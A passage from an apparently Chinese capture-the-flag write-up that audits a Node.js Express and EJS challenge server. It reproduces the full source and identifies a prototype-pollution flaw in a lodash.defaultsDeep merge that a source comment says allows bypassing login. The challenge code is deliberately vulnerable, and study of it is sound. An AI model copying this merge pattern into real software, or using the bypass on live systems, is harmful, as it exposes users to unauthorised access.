class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">'mysql'</span>);</span><br><span class="line"><span class="keyword">const</span> mysqlConfig = <span class="built_in">require</span>(<span class="string">"./config/mysql"</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pool = mysql.createPool(mysqlConfig);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用express空架</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用qs扩展库来处理url编码和可以使用json格式的数据</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json());</span><br><span class="line"><span class="comment">// 设置静态文件目录</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    <span class="comment">// 设置cookie中，保存session的字段的名称，默认为connect.sid</span></span><br><span class="line">    name: <span class="string">'session'</span>,</span><br><span class="line">    <span class="comment">// 通过设置的secret字符串，来计算hash值并放在cookie中，使产生的signedCookie防篡改。</span></span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="comment">// 即使session没有被修改，也保存 session 值，默认为 true。</span></span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 不会存储会话对象</span></span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setHeader</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.set(&#123;</span><br><span class="line">        <span class="comment">// 这个 header 对增加安全性并没有太大作用。</span></span><br><span class="line">        <span class="comment">// 它的值为 off 时，将关闭浏览器对页面中 URL 的 DNS 预读取。</span></span><br><span class="line">        <span class="comment">// DNS 预读取可以提高你的网站的性能，根据 MDN 描述，它可以增加 5% 或更高的图片加载速度。</span></span><br><span class="line">        <span class="comment">// 不过开启这项功能也可能会使用户在多次访问同一个网页时缓存出现问题。</span></span><br><span class="line">        <span class="string">"X-DNS-Prefetch-Control"</span>:<span class="string">"off"</span>,</span><br><span class="line">        <span class="comment">// X-Frame-Options 可以让你控制页面是否能在 &lt;frame/&gt;、&lt;iframe/&gt; 或者 &lt;object/&gt; 之类的页框内加载。</span></span><br><span class="line">        <span class="comment">// 除非你的确需要通过这些方式来打开页面，否则请通过下面的配置完全禁用它：</span></span><br><span class="line">        <span class="string">"X-Frame-Options"</span>: <span class="string">"SAMEORIGIN"</span>,</span><br><span class="line">        <span class="comment">// 这个 header 仅用于保护你的应用免受老版 IE 漏洞的困扰。</span></span><br><span class="line">        <span class="comment">// 一般来说，如果你部署了不能被信任的 HTTP 文件用于下载，用户可以直接打开这些文件（而不需要先保存到硬盘去）并且可以直接在你 app 的上下文中执行。</span></span><br><span class="line">        <span class="comment">// 这个 header 可以确保用户在访问这种文件前必须将其下载到本地，这样就能防止这些文件在你 app 的上下文中执行了。</span></span><br><span class="line">        <span class="string">"X-Download-Options"</span>: <span class="string">"noopen"</span>,</span><br><span class="line">        <span class="comment">// 一些浏览器不使用服务器发送的 Content-Type 来判断文件类型，而使用“MIME 嗅探”，根据文件内容来判断内容类型并基于此执行文件。</span></span><br><span class="line">        <span class="comment">// 假设你在网页中提供了一个上传图片的途径，但攻击者上传了一些内容为 HTML 代码的图片文件，如果浏览器使用 MIME 嗅探则会将其作为 HTML 代码执行，攻击者就能执行成功的 XSS 攻击了。</span></span><br><span class="line">        <span class="comment">// 通过设置 header 为 nosniff 可以禁用这种 MIME 嗅探。</span></span><br><span class="line">        <span class="string">"X-Content-Type-Options"</span>: <span class="string">"nosniff"</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// next函数主要负责将控制权交给下一个中间件，</span></span><br><span class="line">    <span class="comment">// 如果当前中间件没有终结请求，并且next没有被调用，</span></span><br><span class="line">    <span class="comment">// 那么请求将被挂起，后边定义的中间件将得不到被执行的机会</span></span><br><span class="line">    next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(setHeader);</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'json escape'</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 设置模板解析为文件夹</span></span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>);</span><br><span class="line"><span class="comment">// 设置解析文件的模板引擎</span></span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发现利用点</span></span><br><span class="line"><span class="comment"> * 在我们没有登陆以前，</span></span><br><span class="line"><span class="comment"> * req.seesion.login和req.session.userid是undefined的，</span></span><br><span class="line"><span class="comment"> * 而session对象的父类肯定包含了Object，</span></span><br><span class="line"><span class="comment"> * 所以我们只要修改Object中的这部分代码就可以绕过登陆，</span></span><br><span class="line"><span class="comment"> * 以admin身份访问网页。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行sql语句的函数</span></span><br><span class="line"><span class="comment"> * @param sql</span></span><br><span class="line"><span class="comment"> * @param values</span></span><br><span class="line"><span class="comment"> * @returns &#123;Promise&lt;unknown&gt;&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> query = <span class="function"><span class="keyword">function</span>(<span class="params"> sql, values </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class="line">        pool.getConnection(<span class="function"><span class="keyword">function</span>(<span class="params">err, connection</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                reject( err )</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                connection.query(sql, values, ( err, rows) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ( err ) &#123;</span><br><span class="line">                        reject( err )</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resolve( rows )</span><br><span class="line">                    &#125;</span><br><span class="line">                    connection.release()</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>,auth,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/sandbox"</span>,auth,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">"sandbox"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/login'</span>,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( req.method === <span class="string">'POST'</span> )&#123;</span><br><span class="line">        <span class="comment">// 获取username和password</span></span><br><span class="line">        <span class="keyword">if</span>(req.body.username &amp;&amp; req.body.password)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> username = req.body.username;</span><br><span class="line">            <span class="keyword">var</span> password = req.body.password;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据用户名和密码查询用户id</span></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"select id from `user` where username=? and password=?"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> dataList = <span class="keyword">await</span> query( sql,[username,password]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(dataList.length === <span class="number">0</span>)&#123;</span><br><span class="line">                res.send(<span class="string">"&lt;script&gt;  alert('用户名或密码错误.'); location.replace('/login'); &lt;/script&gt;"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(dataList);</span><br><span class="line">            <span class="comment">// 将相应的参数设置到</span></span><br><span class="line">            req.session.userid = dataList[<span class="number">0</span>].id ;</span><br><span class="line">            req.session.login = <span class="literal">true</span> ;</span><br><span class="line">            <span class="comment">// 跳转到首页</span></span><br><span class="line">            res.redirect(<span class="number">302</span>,<span class="string">"/"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有登陆成功就渲染login_register</span></span><br><span class="line">    res.render(<span class="string">'login_register'</span>,&#123;</span><br><span class="line">        title:<span class="string">" storeHtml | logins "</span>,</span><br><span class="line">        buttonHintF:<span class="string">"登 录"</span>,</span><br><span class="line">        buttonHintS:<span class="string">"没有账号?"</span>,</span><br><span class="line">        hint:<span class="string">"登录"</span>,</span><br><span class="line">        next:<span class="string">"/register"</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/register'</span>,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( req.method === <span class="string">'POST'</span> )&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(req.body.username &amp;&amp; req.body.password)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> username = req.body.username;</span><br><span class="line">            <span class="keyword">var</span> password = req.body.password;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"select id from `user` where username=?"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> dataList = <span class="keyword">await</span> query( sql,[username]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(dataList.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                res.send(<span class="string">"&lt;script&gt;alert('用户名重复'); location.replace('/register');&lt;/script&gt;"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"insert into `user` (`username`,`password`) values (?,?) "</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> result = <span class="keyword">await</span> query( sql,[username,password]);</span><br><span class="line">            <span class="built_in">console</span>.log(result);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(result.affectedRows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                res.send(<span class="string">"&lt;script&gt;alert('注册成功');location.replace('/login');&lt;/script&gt;"</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">"&lt;script&gt;alert('注册失败');&lt;/script&gt;"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'login_register'</span>,&#123;</span><br><span class="line">        title:<span class="string">" storeHtml | register "</span>,</span><br><span class="line">        buttonHintF:<span class="string">"注 册"</span>,</span><br><span class="line">        buttonHintS:<span class="string">"已有账号?"</span>,</span><br><span class="line">        hint:<span class="string">"注册"</span>,</span><br><span class="line">        next:<span class="string">"/login"</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ;</span><br><span class="line">    <span class="comment">// 计算html表中的字段的数量</span></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span>;</span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            <span class="comment">// 如果查询出来的结果大于5条，就合并成一条。</span></span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 并且删除已经合并的数据</span></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="comment">// 将合并后的数据插入数据库中</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">            ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(ret);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/add"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.body.type &amp;&amp; req.body.content)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.session.userid;</span><br><span class="line"></span><br><span class="line">        newContent[req.body.type] = [ req.body.content ]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"newContent:"</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="comment">// 向数据库中添加数据</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.json(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// var userid = req.session.userid ;</span></span><br><span class="line">        <span class="comment">// var sql = "select dom from `html` where userid=? " ;</span></span><br><span class="line">        <span class="comment">// var dataList = await query(sql,[userid]);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// var dom = &#123;&#125;</span></span><br><span class="line">        <span class="comment">// if (dataList.length != 0)&#123;</span></span><br><span class="line">        <span class="comment">//     console.log("Old Dom: ",dataList[0].dom)</span></span><br><span class="line">        <span class="comment">//     dom = JSON.parse(dataList[0].dom);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// lodash.defaultsDeep(dom,newContent);</span></span><br><span class="line">        <span class="comment">// console.log("New Dom: ",dom);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// if(dataList.length == 0)&#123;</span></span><br><span class="line">        <span class="comment">//     var sql = "insert into `html` (`userid`,`dom`) values (?,?) ";</span></span><br><span class="line">        <span class="comment">//     var result = await query(sql,[userid, JSON.stringify(dom) ]);</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     sql = "update `html` set `dom` = ? where `userid` = ?";</span></span><br><span class="line">        <span class="comment">//     console.log(JSON.stringify(dom));</span></span><br><span class="line">        <span class="comment">//     var result = await query(sql,[ JSON.stringify(dom),userid]);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// if(result.affectedRows &gt; 0)&#123;</span></span><br><span class="line">        <span class="comment">//     res.json(newContent);</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     res.json(&#123;&#125;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">80</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Listening on port %d'</span>, server.address().port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以发现这个服务器是nodejs来搭建的，并且用了express这个框架，模板渲染引擎用了ejs"><a href="#可以发现这个服务器是nodejs来搭建的，并且用了express这个框架，模板渲染引擎用了ejs" class="headerlink" title="可以发现这个服务器是nodejs来搭建的，并且用了express这个框架，模板渲染引擎用了ejs:"></a>可以发现这个服务器是<code>nodejs</code>来搭建的，并且用了<code>express</code>这个框架，模板渲染引擎用了<code>ejs</code>:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">'mysql'</span>);</span><br><span class="line"><span class="keyword">const</span> mysqlConfig = <span class="built_in">require</span>(<span class="string">"./config/mysql"</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="审计一下代码可以看到有以下的路由："><a href="#审计一下代码可以看到有以下的路由：" class="headerlink" title="审计一下代码可以看到有以下的路由："></a>审计一下代码可以看到有以下的路由：</h6><ul>
+<li><code>/</code>首页</li>
+<li><code>/static</code>静态文件</li>
+<li><code>/sandbox</code>显示用户HTML数据用的沙盒</li>
+<li><code>/login</code>登陆</li>
+<li><code>/register</code>注册</li>
+<li><code>/get</code>json接口获取数据库中保存的数据</li>
+<li><code>/add</code>用户添加数据的接口</li>
+</ul>
+<h6 id="除了-static，-login和-register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证"><a href="#除了-static，-login和-register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证" class="headerlink" title="除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证"></a>除了<code>/static</code>，<code>/login</code>和<code>/register</code>以外，所以路由在访问的时候都会经过一个<code>auth</code>函数进行身份验证</h6><h6 id="因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。"><a href="#因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。" class="headerlink" title="因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。"></a>因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。</h6><h6 id="另外在初始化的时候有这么一句"><a href="#另外在初始化的时候有这么一句" class="headerlink" title="另外在初始化的时候有这么一句"></a>另外在初始化的时候有这么一句</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br></pre></td></tr></table></figure>
+
+<h6 id="所以我们可以通过json格式传递参数到服务端"><a href="#所以我们可以通过json格式传递参数到服务端" class="headerlink" title="所以我们可以通过json格式传递参数到服务端"></a>所以我们可以通过json格式传递参数到服务端</h6><h5 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h5><h6 id="在-get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下"><a href="#在-get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下" class="headerlink" title="在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下"></a>在<code>/get</code>中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line"><span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"><span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">    lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
